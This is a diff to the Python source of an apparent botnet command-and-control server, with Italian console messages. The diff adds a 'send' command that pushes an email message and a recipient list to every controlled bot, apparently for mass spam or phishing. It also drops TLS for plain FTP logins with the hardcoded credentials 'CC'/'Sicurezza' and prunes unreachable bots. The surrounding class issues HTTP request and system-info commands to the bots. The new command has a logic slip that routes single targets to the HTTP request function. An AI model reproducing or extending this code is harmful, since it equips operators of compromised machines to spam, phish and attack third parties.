@@ -3,7 +3,7 @@ import socket
 import json
 from asyncio import Event
 from concurrent.futures import ThreadPoolExecutor
-from ftplib import FTP_TLS
+from ftplib import FTP
 from time import sleep
 
 import requests
@@ -62,22 +62,26 @@ class CC:
         print("Controllo bot attivi...")
         rm = []
         for k, v in self.activeBot.items():
+            http = True
+            ftp = True
             try:
                 url = "http://" + k + ":" + str(v['http']) + "/status"
                 response = requests.get(url, timeout=10)
                 res = response.json()
             except Exception as e:
-                print(k, " is not reachable over http port: ", e)
-
+                print(k, " is not reachable over http port.")
+                del self.activeBot[k]['http']
             try:
                 url = k,":",str(v['ftp'])
-                ftp = FTP_TLS()
+                ftp = FTP()
                 ftp.connect(k,v['ftp'], timeout=10)
                 ftp.login("CC","Sicurezza")
                 ftp.close()
             except Exception as e:
-                print(k, " is not reachable over ftp port: ", e)
-
+                print(k, " is not reachable over ftp port.")
+                del self.activeBot[k]['ftp']
+            if len(self.activeBot[k]) == 2:
+                del self.activeBot[k]
         print("Controllo terminato")
 
     def makeHTTPRequest(self, server, time=1, target=""):
@@ -155,6 +159,38 @@ class CC:
             except Exception as e:
                 print(e)
 
+    def sendEmail(self, message, file, target=""):
+        users = None
+
+        try:
+            with open(file, 'r') as f:
+                users = json.load(f)
+        except Exception as e:
+            print("File error:",e)
+
+
+        print("Invio richiesta...")
+        if target == "":
+            for k, v in self.activeBot.items():
+                try:
+                    url = "http://" + k + ":" + str(v["http"]) + "/sendEmail"
+                    response = requests.post(url, json={"messaggio": message, "utenti": users["utenti"]}, timeout=10)
+                    res = response.json()
+                    self.activeBot[k]["target"] = res["target"]
+                    self.activeBot[k]["action"] = res["action"]
+                except Exception as e:
+                    print("Impossibile inviare la richiesta a", k, e)
+        else:
+            try:
+                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/sendEmail"
+                response = requests.post(url, json={"messaggio": message, "utenti": users["utenti"]}, timeout=10)
+                res = response.json()
+                self.activeBot[target]["target"] = res["target"]
+                self.activeBot[target]["action"] = res["action"]
+            except Exception as e:
+                print("Impossibile inviare la richiesta a", target, e)
+        print("Richiesta inviata")
+
     def command(self, event):
         sleep(1)
         while (True):
@@ -207,6 +243,18 @@ class CC:
                         self.getSystemInfo(target=c[1])
                     else:
                         print("Command not found. Correct command [info [all | target(ip)]]")
+            #Comando per mandare email
+            elif comando.startswith("send"):
+                c = comando.split(" ")
+                if len(c) < 4:
+                    print("Command not found")
+                if c[3] == "all":
+                    self.sendEmail(c[1], c[2])
+                elif c[3] in self.activeBot:
+                    self.makeHTTPRequest(c[1], c[2], target=c[3])
+                else:
+                    print(
+                        "Command not found. Correct command [send [message] [users (fileName)] [all | target(ip)]]")
             #Comando per verificare la raggiungibilità dei bot
             elif comando.startswith("ck"):
                 c = comando.split(" ")
@@ -222,6 +270,7 @@ class CC:
                 print("Command not found")
                 continue
     # load activeBot from file
+
     def loadData(self):
         with open("./activeBot.json", 'r') as f:
             self.activeBot = json.load(f)
